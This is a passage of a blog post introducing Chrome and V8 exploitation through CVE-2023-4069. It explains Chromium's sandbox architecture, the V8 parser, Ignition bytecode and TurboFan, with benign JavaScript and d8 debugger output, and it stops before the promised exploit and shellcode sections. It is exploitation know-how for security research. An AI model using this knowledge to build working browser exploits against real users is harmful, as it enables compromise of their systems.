<!DOCTYPE html>
<html lang="en">
    <head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="Matteo Malvica">
<meta name="description"
    content="Introduction Originally, I intended to write a simple note on the Maglev compiler and how to adjust V8 shellcode from Linux to Windows. But as I started, the project grew unexpectedly. I found myself diving into some prerequisites like the V8 pipeline and a root cause analysis of CVE-2023-4069, the bug we are about to explore.
What began as a brief memo soon unfolded into a deeper exploration and I hope the reader will find some benefits from these additional insights." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<title>
    An Introduction to Chrome Exploitation  - Maglev Edition ::   — uf0
</title>
	<link rel="canonical" href="https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev.html" />
<link href="../../../../ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">
<link rel="stylesheet" href="../../../../main.min.ff759f2a796cae22d12f15d9ed52bb682ec25fbef0e2d95a2ae9e53f30536694.css">
<link rel="apple-touch-icon" sizes="180x180" href="../../../../apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="../../../../favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="../../../../favicon-16x16.png">
<link rel="manifest" href="https://www.matteomalvica.com/site.webmanifest">
<link rel="mask-icon" href="../../../../safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="../../../../favicon.ico">
<meta name="theme-color" content="#252627">
  <meta itemprop="name" content="An Introduction to Chrome Exploitation  - Maglev Edition">
  <meta itemprop="description" content="An Introduction to Chrome Exploitation  - Maglev Edition">
  <meta itemprop="datePublished" content="2024-06-05T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-06-05T00:00:00+00:00">
  <meta itemprop="wordCount" content="14012">
  <meta itemprop="image" content="https://www.matteomalvica.com/img/v8/train.png">
  <meta itemprop="keywords" content="V8,Exploitation,Maglev,Chrome">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://www.matteomalvica.com/img/v8/train.png">
  <meta name="twitter:title" content="An Introduction to Chrome Exploitation  - Maglev Edition">
  <meta name="twitter:description" content="An Introduction to Chrome Exploitation  - Maglev Edition">
<meta property="article:published_time" content="2024-06-05 00:00:00 &#43;0000 UTC" />
    </head>
    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="../../../../index.html" style="text-decoration: none;">
    <div class="logo">
            <span class="logo__mark">></span>
            <span class="logo__text">/home/uf0</span>
            <span class="logo__cursor"></span>
    </div>
</a>
        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="../../../../blog.html">blog</a></li><li><a href="../../../../whoami.html">whoami</a></li>
    </ul>
</nav>
                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-18TCRTW8CL"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-18TCRTW8CL');
        }
      </script>
                <script async src="https://www.googletagmanager.com/gtag/js?id=G-RE0LE7QK5X"></script>
                <script>
                window.dataLayer = window.dataLayer || [];
                function gtag(){dataLayer.push(arguments);}
                gtag('js', new Date());
                gtag('config', 'G-RE0LE7QK5X');
                </script>
            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>
            <div class="content">
    <main class="post">
        <div class="post-info">
            </p>
        </div>
        <article>
            <h1 class="post-title"><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html">An Introduction to Chrome Exploitation  - Maglev Edition</a></h1>
            <div class="post-content">
  <img src="../../../../img/v8/maglev.png"  alt="PRE"  class="center"  />
<h2 id="introduction">Introduction</h2>
<p>Originally, I intended to write a simple note on the Maglev compiler
and how to adjust V8 shellcode from Linux to Windows. But as I
started, the project grew unexpectedly. I found myself diving into
some prerequisites like the V8 pipeline and a root cause analysis of
CVE-2023-4069, the bug we are about to explore.</p>
<p>What began as a brief memo soon unfolded into a deeper exploration and
I hope the reader will find some benefits from these additional
insights. In any case, the table of contents is there to guide you
directly to the sections that most capture your interest :)</p>
<p><strong>Table of Contents</strong></p>
<ol start="0">
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#introduction">Introduction</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#the-chromium-security-architecture">The Chromium Security Architecture</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#the-v8-pipeline">The V8 Pipeline</a>
<ul>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#the-parser">The Parser</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#the-interpreter---ignition">The Interpreter - Ignition</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#the-jit-compiler---turbofan">The JIT Compiler - TurboFan</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#the-maglev-compiler">The Maglev Compiler</a></li>
</ul>
</li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#setting-up-the-v8-debugging-environment">Setting up the V8 Debugging Environment</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#cve-2023-4069-walkthrough">CVE-2023-4069 RCA and Walkthrough</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#jit-spraying-shellcode">JIT-Spraying Shellcode</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#addendum-version-independent-shellcode">Addendum: Version Independent Shellcode</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#conclusions">Conclusions</a></li>
<li><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#external-references">External References</a></li>
</ol>
<h2 id="the-chromium-security-architecture">The Chromium Security Architecture</h2>
<p>Before we get into the nitty-gritty of the renderer process and the V8
engine, let&rsquo;s take a step back and look at the big picture.
Understanding how Chromium&rsquo;s overall architecture works will help make
sense of all the details we&rsquo;re about to dive into.</p>
<p>Chromium uses a multi-process architecture to separate different tasks
into different processes. This separation increases the browser&rsquo;s
stability and security because issues in one process (like a tab
crashing) do not affect the others.</p>
<p>The <a href="https://www.chromium.org/Home/chromium-security/guts/">Chromium
Project</a> image
below provides a color-by-risk overview of the browser&rsquo;s components.</p>
<p><img src="../../../../img/v8/chromium1.png">
<em>The Chromium Security Architecture</em></p>
<p>In the diagram, we see several distinct process types:</p>
<p><strong>Browser Process</strong>: Outlined in red, it manages the user interface,
disk and network I/O, and acts as the central coordinator for the
other processes. It operates with full user privileges and manages
most system resources, including the user profile and persistent data.</p>
<p><strong>Renderer Processes</strong>: Handle rendering web pages and executing
JavaScript. Each website or web application typically runs in its own
renderer process, isolated from others. These processes are subject to
strict mitigations — such as the sandbox — to ensure the
secure rendering of web content.</p>
<p><strong>GPU Process</strong>: Illustrated in green, it handles GPU tasks separate
from rendering web content, improving performance and security.
Running with minimal permissions, it handles graphics-intensive tasks
efficiently.</p>
<p><strong>Utility Process</strong>: This process handles short-lived operations and
can run sandboxed or unsandboxed depending on the specific function,
such as printing.</p>
<p>Lastly, the <em>PPAPI</em> (Pepper Plugin API) Broker Process and the <em>NaCl</em>
(Native Client) Loader Process are two components in Chromium’s
architecture that manage different aspects of running code within the
browser.</p>
<p>For each process, Chromium enforces two security measures: <em>sandboxing</em>
and the <em>principle of least privilege</em>.</p>
<p>Each renderer and plugin process is run within a
<a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/design/sandbox.md">sandbox</a>,
a restricted environment that limits the process&rsquo;s ability to read and
write to the disk, interact with the OS, or communicate over the
network. This containment strategy significantly reduces the risk of
malicious code escaping the browser and affecting the entire user&rsquo;s
system.</p>
<p>In addition, each process operates with the least privilege necessary
to perform its functions. For example, renderer processes have very
limited access to system resources, and any action that requires more
privileges (like saving a file) must go through the browser process,
which acts as a security gatekeeper.</p>
<p>Turning now our focus to the main topic of this blog post, we&rsquo;re going
to take a closer look at the renderer process in Chromium. The
renderer process is critical to the browser&rsquo;s security as it&rsquo;s
responsible for drawing web pages and executing untrusted JavaScript
code, making it a prime target for exploits.</p>
<p>This brings us to the V8 engine, which is inherently linked to the
renderer process. <a href="https://v8.dev/">V8</a> is the JavaScript and
WebAssembly engine powering this process, parsing and executing the
code that defines user interactions and site functionalities.
Understanding V8 is essential because any issues here directly impact
the security and stability of the renderer process.</p>
<p>Let&rsquo;s explore in more detail the different components that make the V8
Chromium JIT pipeline efficient and examine how its inherent
complexity can lead to type confusion bugs.</p>
<h2 id="the-v8-pipeline">The V8 Pipeline</h2>
<p>In its <a href="https://docs.google.com/presentation/d/1_eLlVzcj94_G4r9j9d_Lj5HRKFnq6jgpuPJtnmIBs88/edit#slide=id.g2134da681e_0_59">original
inception</a>
from 2008, V8 was designed with simplicity in mind and involved only
three major steps.</p>
<p><img src="../../../../img/v8/pipeline0.png">
<em>The V8 Pipeline in 2008 - Source: Google</em></p>
<p>It all begins with JavaScript source code that is fed into the
compiler pipeline. This JS code is first processed by a parser, which
checks syntax and structures it into an <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract Syntax Tree
(AST)</a>. The AST
represents the program&rsquo;s syntax in a hierarchical tree format, with
each node representing different constructs in the source code.</p>
<p>Following this, the AST is transformed into executable code through a
process called code generation (codegen), initially producing
semi-optimized machine code. This code is already executable but not
fully optimized, allowing for quick, but not fully efficient, execution.</p>
<p>As websites became more complex, so did their JavaScript. It then
became necessary to improve browser performance.</p>
<p>The idea of <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">Just-in-time
(JIT)</a>
compilation helped meet those demands for performance. This approach
differs from traditional compilation, which converts code to machine
language before it is executed on a target device (known as
Ahead-Of-Time, or AOT, compilation). Conversely, JIT compilation is a
technique where computer code is compiled into machine language at
runtime rather than prior to execution.</p>
<p>JIT compilers aim to combine the speed of compiled code with the
flexibility of interpretation, often used in environments where code
may change at runtime or where fast startup time is needed, as in
modern browsers.</p>
<p>The concept of JIT compilation became popular in the 90s with the rise
of virtual machine environments like the Java Virtual Machine (JVM)
and the .NET Common Language Runtime (CLR). These environments use JIT
compilation to execute platform-independent code like Java bytecode or
<a href="https://learn.microsoft.com/en-us/dynamicsax-2012/appuser-itpro/compile-into-net-framework-cil">CIL</a>
code in the .NET framework.</p>
<p>In 2010, the first JIT compiler named
<a href="https://blog.chromium.org/2010/12/new-crankshaft-for-v8.html">Crankshaft</a>
was launched and later, in 2014, replaced by the well-known and more
performant <a href="https://v8.dev/docs/turbofan">TurboFan</a>.</p>
<p>TurboFan utilizes a flexible intermediate representation allowing for
sophisticated code optimizations. It excels in optimizing new language
constructs such as classes, destructuring, and default parameters,
which its predecessor Crankshaft struggled with.</p>
<p>For the past decade, TurboFan has been a part of the V8 pipeline,
along with its counterpart interpreter,
<a href="https://v8.dev/docs/ignition">Ignition</a>. Together, they define the
well-established modern JIT pipeline, as depicted below.</p>
<p><img src="../../../../img/v8/pipeline2.png">
<em>The V8 Pipeline Over Recent Years - Source: Google</em></p>
<p>Ignition plays an initial role in the V8 pipeline by compiling
JavaScript code into bytecode rather than directly executing it as
machine code. This bytecode is a more compact and quicker-to-execute
form of the source JavaScript, facilitating faster startup times and
less memory usage compared to full machine code compilation.</p>
<p>Ignition also collects type feedback and execution statistics while
interpreting the bytecode, which is essential for the subsequent
optimization phase. This data informs TurboFan about how the code is
being used in practice, enabling it to make more informed optimization
decisions. When specific functions or code blocks are identified as
performance-critical, TurboFan takes over, using the data it has
obtained to compile these parts into optimized machine code.</p>
<p>In this way, Ignition sets the stage for TurboFan&rsquo;s optimization,
striking a balance between initial execution speed and longer-term
performance efficiency in V8&rsquo;s execution of JavaScript.</p>
<p>Let&rsquo;s now explore the V8 compiler pipeline by providing examples for
each of the steps involved, beginning with the parser.</p>
<h3 id="the-parser">The Parser</h3>
<p>We mentioned that the first step involves the parser. But what&rsquo;s
actually does a parser?</p>
<ol>
<li>
<p><strong>Lexical Analysis (Tokenization)</strong>
The first step in the parsing process is lexical analysis, where
the V8 engine converts the raw JavaScript code into tokens. Tokens
are the smallest meaningful units of the program, such as keywords
(if, return, etc.), identifiers, operators, and literals. This step
involves scanning the code character by character and grouping these
characters into tokens based on JavaScript syntax rules.</p>
</li>
<li>
<p><strong>Syntax Analysis</strong> After tokenization, the syntax analysis phase
begins, where the tokens are analyzed against JavaScript&rsquo;s grammar
rules to build a parse tree. This parse tree represents the syntactic
structure of the code. Syntax analysis checks if the arrangement
of tokens adheres to the language&rsquo;s grammar, defined withing
<a href="https://tc39.es/ecma262/">ECMAscript</a>, ensuring that the code is
syntactically correct. If there are any syntax errors (like missing
brackets or misused keywords), this is the stage at which they are
typically detected and reported.</p>
</li>
<li>
<p><strong>Parse Tree to Abstract Syntax Tree (AST)</strong>
Transformation Although the parse tree is a detailed representation
of the code structure, it often contains every detail of the
syntax, which can be verbose and include redundant information that
isn&rsquo;t necessary for execution. Therefore, the next step involves
transforming this parse tree into an Abstract Syntax Tree (AST),
which is a more compact and meaningful representation of the syntactic
structure.</p>
</li>
</ol>
<p>To illustrate the concept, let&rsquo;s consider this simple JavaScript snippet:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Copy</span> <span class="nx">code</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">sum</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span><span class="p">;</span>
</span></span></code></pre></div><blockquote>
<p>Simple JS variable</p>
</blockquote>
<p>During the first step, <em>Lexical Analysis</em> (or Tokenization, the engine
reads the JavaScript code and breaks it down into sensical pieces,
called tokens. For the above code snippet, the derived tokens would
be:</p>
<ul>
<li><em>let</em>: a keyword that indicates variable declaration.</li>
<li><em>sum</em>: an identifier used as the variable name.</li>
<li><em>=</em>: an assignment operator.</li>
<li><em>a</em>: an identifier representing a variable.</li>
<li><em>+</em>: an arithmetic operator for addition.</li>
<li><em>b</em>: another identifier representing a variable.</li>
<li><em>;</em>: a semicolon marking the end of the statement.</li>
</ul>
<p>Each token is then categorized based on its type (keyword, identifier,
operator, etc.) during this phase.</p>
<p>On the second step, <em>Syntax Analysis</em>, the parser uses the tokens to
construct a parse tree based on the grammar of the language. This
tree represents the syntactic structure of the code, ensuring that the
arrangement of tokens follows JavaScript&rsquo;s ECMAscript rules. For our
snippet, the parse tree would have a hierarchical structure somewhat
like this:</p>
<ul>
<li>Statement (Variable Declaration)
<ul>
<li>Keyword: <em>let</em></li>
<li>Identifier: <em>sum</em></li>
<li>Assignment Operator: <em>=</em></li>
<li>Expression:
<ul>
<li>Identifier: <em>a</em></li>
<li>Operator: <em>+</em></li>
<li>Identifier: <em>b</em></li>
</ul>
</li>
<li>End of statement: <em>;</em></li>
</ul>
</li>
</ul>
<p>This parse tree checks that the syntax is valid, like ensuring the
identifiers are correctly placed around the assignment operator and
the addition operation.</p>
<p>As third and last step, the parse tree, which includes all syntactic
details, is then transformed into an <em>Abstract Syntax Tree</em> or AST,
which is more abstract and streamlined for the purposes of execution.</p>
<p>In the AST, unnecessary syntactic details like the semicolon might
be omitted, focusing more on the core components necessary for
understanding the logic and flow of the code.</p>
<p>The AST for our example might look like:</p>
<ul>
<li>VariableDeclaration
<ul>
<li>Identifier: <em>sum</em></li>
<li>AssignmentExpression
<ul>
<li>BinaryExpression
<ul>
<li>Left: Identifier <em>a</em></li>
<li>Operator: <em>+</em></li>
<li>Right: Identifier <em>b</em></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>This AST focuses on the logical connections: <em>sum</em> is declared
and assigned the result of <em>a + b</em>. It abstracts away the specific
syntax used (like &rsquo;let&rsquo; or &lsquo;;&rsquo;) to focus on the operations and their
operands.</p>
<p>Having explored the theory behind the parser and AST, we can now
verify it with the V8 debugger.</p>
<p>We&rsquo;ll do so while getting familiar with the V8 debugging tool
<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/d8/">d8</a>,
which will be our target for the final exploit.</p>
<p>The d8 shell is primarily used for debugging and testing V8 engine
features and supports various command-line flags that enable deep
dives into V8’s processing of JavaScript code, such as displaying the
Abstract Syntax Tree (AST) or tracing function optimizations.</p>
<p>Assuming we already managed to correctly compile V8 on Windows(jump to
<a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#setting-up-the-v8-debugging-environment">Setting up the V8 Debugging
Environment</a> if not) it
should contain an executable version of the d8 debugger under the
<code>\v8\out\x64.debug</code> folder.</p>
<p>Our testing code will look like the following, and it&rsquo;s a simple
JavaScript function that returns the square of an object property.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">square</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">x</span> <span class="o">*</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">square</span><span class="p">({</span><span class="nx">x</span><span class="o">:</span><span class="mi">42</span><span class="p">});</span>
</span></span></code></pre></div><blockquote>
<p>JS function that returns the square of an object&rsquo;s property value.</p>
</blockquote>
<p>We can save its content as &lsquo;square.js&rsquo; and invoke the d8 instance with
the <em>&ndash;print-ast</em> flag in order to print out the AST and load the
saved JS file from within d8.</p>
<pre tabindex="0"><code>C:\dev\v8\v8\out&gt;x64.debug\d8.exe --print-ast
V8 version 11.5.150.16
d8&gt; load(&#39;square.js&#39;)
...
[generating bytecode for function: square]
--- AST ---
FUNC at 15
. KIND 0
. LITERAL ID 1
. SUSPEND COUNT 0
. NAME &#34;square&#34;
. PARAMS
. . VAR (000002363D807850) (mode = VAR, assigned = false) &#34;obj&#34;
. DECLS
. . VARIABLE (000002363D807850) (mode = VAR, assigned = false) &#34;obj&#34;
. RETURN at 28
. . MUL at 41
. . . PROPERTY at 39
. . . . VAR PROXY parameter[0] (000002363D807850) (mode = VAR, assigned = false) &#34;obj&#34;
. . . . NAME x
. . . PROPERTY at 47
. . . . VAR PROXY parameter[0] (000002363D807850) (mode = VAR, assigned = false) &#34;obj&#34;
. . . . NAME x
...
</code></pre><blockquote>
<p>Generating AST with d8</p>
</blockquote>
<p>The output is pretty lengthy, so we&rsquo;ll just describe the first AST
definition and break down the key parts of this output to understand
what they represent.</p>
<ul>
<li><em>FUNC</em> node describes the function <em>square</em> with a parameter <em>obj</em>.</li>
<li><em>PARAMS</em> and <em>DECLS</em> nodes define the variable <em>obj</em> used as the function&rsquo;s parameter.</li>
<li><em>RETURN</em> node indicates the return statement of the function.</li>
<li><em>MUL</em> node under the return statement represents the multiplication operation, indicating the function returns the product of two values.</li>
<li><em>PROPERTY</em> nodes access the property <em>x</em> of the parameter <em>obj</em> twice, as required by the multiplication operation.</li>
</ul>
<p>All the AST expression statements can be found under the
<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/ast/ast.h">header</a>
definition in the V8 codebase.</p>
<h3 id="the-interpreter---ignition">The Interpreter - Ignition</h3>
<p>With the Abstract Syntax Tree (AST) effectively constructed, the next
phase involves the V8 interpreter, aptly named Ignition.</p>
<p><a href="https://docs.google.com/document/d/11T2CRex9hXxoJwbYqVQ32yIPMh0uouUZLdyrtmMoL44/edit?pli=1#heading=h.6jz9dj3bnr8t">Ignition</a> takes the AST and systematically walks through it to generate
<a href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775">bytecode</a>.</p>
<p>The bytecode is a lower-level, simpler set of instructions
that the engine can execute directly. Unlike the AST, which is
more abstract and serves as a high-level representation of the code
structure, bytecode is closer to machine code, making it faster and
more efficient for execution.</p>
<p>After this bytecode generation, the AST is no longer necessary and is
therefore deleted to free up resources. The bytecode then enters the
execution phase, where V8&rsquo;s virtual machine executes it to perform the
operations defined by the original JavaScript code.</p>
<p>A key aspect of the virtual machine operations involves the use of
registers, specifically labeled as r0, r1, r2, etc., and an
accumulator register. The accumulator is central to the execution of
almost all bytecodes, though it is not directly specified in the
bytecode instructions themselves. For example, in the bytecode
instruction <em>Add r1</em>, the value in register r1 is added to the value
currently held in the accumulator.</p>
<p>To get a better understanding, let&rsquo;s see how real bytecode looks like
under the V8 debugger.</p>
<p>To print out the bytecode of a JavaScript function using the d8 shell
from the V8 engine, we can use the <code>--print-bytecode</code> flag. This flag
allows us to observe the bytecode that V8 generates for a specific
JavaScript function.</p>
<p>Let&rsquo;s revisit the same JavaScript square function we examined earlier.</p>
<p>We can invoke the square function by passing an object with a small
integer (<a href="https://medium.com/fhinkel/v8-internals-how-small-is-a-small-integer-e0badc18b6da">SMI</a>) property.</p>
<pre tabindex="0"><code>d8&gt; load (&#39;square.js&#39;)
[generated bytecode for function:  (0x03bb0011a759 &lt;SharedFunctionInfo&gt;)]
...
d8&gt; square({x:42});
[generated bytecode for function:  (0x03bb0011b66d &lt;SharedFunctionInfo&gt;)]
Bytecode length: 15
Parameter count 1
Register count 3
Frame size 24
Bytecode age: 0
         000003BB0011B6FA @    0 : 21 00 00          LdaGlobal [0], [0]
         000003BB0011B6FD @    3 : c4                Star1
         000003BB0011B6FE @    4 : 7d 01 02 29       CreateObjectLiteral [1], [2], #41
         000003BB0011B702 @    8 : c3                Star2
         000003BB0011B703 @    9 : 62 f9 f8 03       CallUndefinedReceiver1 r1, r2, [3]
         000003BB0011B707 @   13 : c5                Star0
         000003BB0011B708 @   14 : aa                Return
Constant pool (size = 2)
000003BB0011B6C9: [FixedArray] in OldSpace
 - map: 0x03bb00000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 2
           0: 0x03bb0011a6cd &lt;String[6]: #square&gt;
           1: 0x03bb0011b6b5 &lt;ObjectBoilerplateDescription[3]&gt;
Handler Table (size = 0)
Source Position Table (size = 0)
[generated bytecode for function: square (0x03bb0011a915 &lt;SharedFunctionInfo square&gt;)]
Bytecode length: 13
Parameter count 2
Register count 1
Frame size 8
Bytecode age: 0
         000003BB0011B7EA @    0 : 2d 03 00 01       GetNamedProperty a0, [0], [1]
         000003BB0011B7EE @    4 : c5                Star0
         000003BB0011B7EF @    5 : 2d 03 00 01       GetNamedProperty a0, [0], [1]
         000003BB0011B7F3 @    9 : 3a fa 00          Mul r0, [0]
         000003BB0011B7F6 @   12 : aa                Return
Constant pool (size = 1)
000003BB0011B7BD: [FixedArray] in OldSpace
 - map: 0x03bb00000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x03bb00002bb9 &lt;String[1]: #x&gt;
Handler Table (size = 0)
Source Position Table (size = 0)
1764
...
</code></pre><blockquote>
<p>Generating Bytecode with d8</p>
</blockquote>
<p>From the debugger, we can see that Ignition has generated two bytecode
functions.</p>
<p>The first function is responsible for setting up the context and
calling the <em>square</em> function with a specific object. The second
function is the bytecode of the <em>square</em> function itself that
calculates the square of the property <em>x</em> of an object. Let&rsquo;s explore
each part in detail.</p>
<p>As mentioned, the first bytecode block is to prepare the environment
and call the <em>square</em> function:</p>
<ul>
<li>
<p><strong>LdaGlobal [0], [0]</strong>: Load a global variable (the <em>square</em>
function) into the accumulator. The first <em>[0]</em> is an index or
reference to the name of the property in the constant pool. The
constant pool is a table that holds various constants, such as
strings, numbers, and other metadata used by the bytecode. <em>[0]</em> here
would refer to the position in the constant pool where the property
name is stored. The rightmost <em>[0]</em>  instead, is an index or a hint
used internally by the V8 engine for optimization purposes.</p>
</li>
<li>
<p><strong>Star1</strong>: Store the value from the accumulator into register <em>r1</em>.</p>
</li>
<li>
<p><strong>CreateObjectLiteral [1], [2], #41</strong>: Create an object literal,
which in this case is the object <em>{x: 42}</em>. The constants <em>[1]</em> and
<em>[2]</em> point to template information for the object.</p>
</li>
<li>
<p><strong>Star2</strong>: Store the newly created object into register <em>r2</em>.</p>
</li>
<li>
<p><strong>CallUndefinedReceiver1 r1, r2, [3]</strong>: Call the function stored in
<em>r1</em> (<em>square</em>) with <em>r2</em> as the argument (the <em>{x: 42}</em> object).</p>
</li>
<li>
<p><strong>Star0</strong> and <strong>Return</strong>: Store the result of the function call in
<em>r0</em> and return that value.</p>
</li>
</ul>
<p>The second bytecode block represents the <em>square</em> function execution,
which squares the <em>x</em> property of an object:</p>
<ul>
<li>
<p><strong>GetNamedProperty a0, [0], [1]</strong>: Get the property named <em>x</em> from
the object passed as the argument and store it in the accumulator.</p>
</li>
<li>
<p><strong>Star0</strong>: Store the property value into <em>r0</em>.</p>
</li>
<li>
<p><strong>GetNamedProperty a0, [0], [1]</strong>: Once more, since it&rsquo;s a square
operation, it loads the same value into the accumulator.</p>
</li>
<li>
<p><strong>Mul r0, [0]</strong>: Multiply the value in <em>r0</em> by the one stored in the
accumulator. In this case, the values multiplied are the same.</p>
</li>
<li>
<p><strong>Return</strong>: Return the result of the multiplication that is stored
in the accumulator.</p>
</li>
</ul>
<p>Having understood how Ignition handles the initial execution of
JavaScript code through bytecode, it&rsquo;s now time to explore the final
piece of V8&rsquo;s pipeline: <em>TurboFan</em>.</p>
<h3 id="the-jit-compiler---turbofan">The JIT compiler - Turbofan</h3>
<p>Simply put, what <em>TurboFan</em> does is turn bytecode into highly
optimized code.</p>
<p>It was
<a href="https://benediktmeurer.de/2017/03/01/v8-behind-the-scenes-february-edition">originally</a>
conceived to speed up applications running on
<a href="../../../../wiki/Asm.js">asm.js</a> and was later improved
to optimize many other use cases where better performance was
necessary.</p>
<p>On top of generating bytecode, the Ignition engine in V8 collects
information about how the code runs, which helps it understand how to
access parts of the code more quickly in future runs. For instance, if
a piece of code accesses a property in the same way multiple times,
Ignition remembers this to avoid repeated searches, using a technique
called <a href="https://en.wikipedia.org/wiki/Inline_caching">inline caching</a>.</p>
<p>The information that Ignition gathers during code execution is saved
in a Feedback Vector (once called the Type Feedback Vector). This is a
special data storage area attached to the function, and it has
different sections for different types of feedback, like bitsets,
other functions, or class types, tailored to specific optimization
needs.</p>
<p>This information is also used by TurboFan, which anticipates the types
of data it will see based on past operations to optimize the code
further, allowing JavaScript to run faster. This process is known as
<a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">Speculative
Optimization</a>.</p>
<p>Before emitting optimal machine code, TurboFan has to know how to make
sense of the feedback vectors received by Ignition. It does so by
building a graph named <a href="https://en.wikipedia.org/wiki/Sea_of_nodes">Sea of Nodes</a>.</p>
<p>Sea of Nodes is a graph-based
intermediate representation (IR) of the program&rsquo;s code. In this
representation, the program is visualized as a network (or &ldquo;sea&rdquo;) of
interconnected nodes, where each node represents operations or values
(like arithmetic operations, constants, variables, etc.). This
graphical structure goes beyond traditional linear execution paths,
focusing instead on the relationships and dependencies between
operations.</p>
<p>TurboFan leverages this representation through multiple optimization
phases,like dead code elimination, constant folding, and <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#typer-phase">type
lowering</a>.
Going deeper into Sea of Nodes and optimization is beyond the scope of
this blog post, but the reader is encouraged to further explore the topic.</p>
<p>Great resources about Turbofan are Jeremy Fativeau <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">Introduction to
Turbofan</a>
and Jack Halon&rsquo;s <a href="https://jhalon.github.io/chrome-browser-exploitation-2/">blog post
series</a> about
Chrome exploitation.</p>
<p>Back to our Turbofan JIT example, let&rsquo;s analyze how the V8 pipeline
switches from Ignition to Turbofan.</p>
<p>In the below example, the hot_square` function is repeatedly invoked
within a loop, suggesting it&rsquo;s a &ldquo;hot&rdquo; function due to its frequent
execution. After several iterations, V8&rsquo;s runtime profiler identifies
it as a candidate for optimization.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hot_square</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">x</span> <span class="o">*</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">999999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
